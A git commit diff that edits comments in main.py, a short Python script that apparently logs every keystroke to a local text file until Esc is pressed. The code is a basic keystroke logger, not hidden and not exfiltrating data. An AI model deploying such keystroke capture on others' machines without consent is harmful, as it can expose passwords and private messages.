8e0f09ecdc626600a2e4ead09f0a03e25a9e5ae4
Leslie Asava <51715921+leslie-asava@users.noreply.github.com>
2019-11-25 14:42:49 +0300

    Add files via upload

--- main.py
+++ main.py
@@ -9,14 +9,14 @@ filename+=".txt"
 file = open(filename,"w")
 
 def on_press(key):
+    # Add the keystroke to a file
     file.write('{0}\n'.format(key))
 
 def on_release(key):
     if key == Key.esc:
-        # Stop listener
+        # Close text file and stop listening
         file.close()
         return False
 
-# Collect events until released
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
